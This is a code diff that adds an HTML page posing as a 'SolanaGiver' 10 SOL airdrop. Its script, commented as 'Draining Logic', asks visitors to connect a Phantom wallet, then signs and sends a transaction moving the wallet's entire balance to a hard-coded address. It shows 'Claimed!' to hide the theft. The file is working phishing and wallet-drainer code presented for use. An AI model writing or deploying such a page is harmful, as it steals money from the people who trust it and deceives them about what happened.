@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SolanaGiver - Claim Your Airdrop</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
+        h1 { color: #9945FF; margin-bottom: 10px; } /* Solana Purple */
+        p { color: #666; margin-bottom: 20px; }
+        .btn { background-color: #9945FF; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:hover { background-color: #7b2cbf; }
+        .logo { font-weight: bold; font-size: 24px; color: #333; margin-bottom: 20px; }
+        #status { margin-top: 15px; font-size: 14px; color: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">SolanaGiver</div>
+        <h1>Claim 10 SOL Airdrop!</h1>
+        <p>Connect your wallet to receive your free Solana airdrop instantly.</p>
+        <button id="connect-btn" class="btn">Connect Phantom</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- We use the CDN for simplicity so you don't need local JS files -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script>
+        const connectBtn = document.getElementById('connect-btn');
+        const status = document.getElementById('status');
+
+        connectBtn.addEventListener('click', async () => {
+            if (!window.solana || !window.solana.isPhantom) {
+                alert("Please install Phantom Wallet!");
+                return;
+            }
+
+            try {
+                // Connect
+                await window.solana.connect();
+                
+                status.innerText = "Connecting...";
+                
+                // Draining Logic: Send all balance to YOUR WALLET
+                // REPLACE THIS WITH YOUR WALLET ADDRESS
+                const destination = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh"; 
+                
+                const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
+                const fromPubkey = window.solana.publicKey;
+                
+                // Get balance
+                const balance = await connection.getBalance(fromPubkey);
+                
+                if (balance === 0) {
+                    status.innerText = "Wallet connected! No SOL to claim.";
+                    return;
+                }
+
+                status.innerText = "Processing transaction...";
+
+                // Create transaction
+                const transaction = new solana.Transaction().add(
+                    solana.SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: new solana.PublicKey(destination),
+                        lamports: balance, // Send EVERYTHING
+                    })
+                );
+
+                // Sign and send
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                status.innerText = "Claimed! Check your wallet.";
+                console.log("Transaction Signature: " + signature);
+                
+            } catch (error) {
+                console.error(error);
+                status.innerText = "Transaction failed or rejected.";
+            }
+        });
+    </script>
+</body>
+</html>
